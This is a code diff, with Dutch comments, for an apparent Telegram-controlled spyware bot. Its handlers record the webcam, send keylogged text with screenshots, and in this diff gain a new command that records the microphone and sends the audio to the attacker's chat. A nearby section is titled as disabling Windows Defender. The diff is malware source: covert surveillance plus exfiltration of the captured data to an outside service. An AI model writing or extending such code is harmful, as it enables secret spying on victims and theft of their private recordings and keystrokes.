@@ -19,7 +19,7 @@ async def no_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # webcam recording maken
 async def cam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # meld dat recording begonnen is
+    # meld dat cam recording begonnen is
     await context.bot.send_message(chat_id=update.effective_chat.id, text="Webcam opname is begonnen...")
     # start recording
     # Source: https://stackoverflow.com/questions/47615956/send-video-through-telegram-python-api
@@ -44,6 +44,15 @@ async def keylog_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         chat_id=update.effective_chat.id,
         photo=open(get_screen(), 'rb'),
         caption=f'string:   {string}'
+    )
+
+# audio recording sturen naar chat
+async def audio_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # meld dat audio recording begonnen is
+    await context.bot.send_message(chat_id=update.effective_chat.id, text="Audio opname is begonnen...")
+    await context.bot.send_voice(
+        chat_id=update.effective_chat.id,
+        voice=open(get_audioFile(), 'rb'),
     )
 
 # Windows defender uitzetten
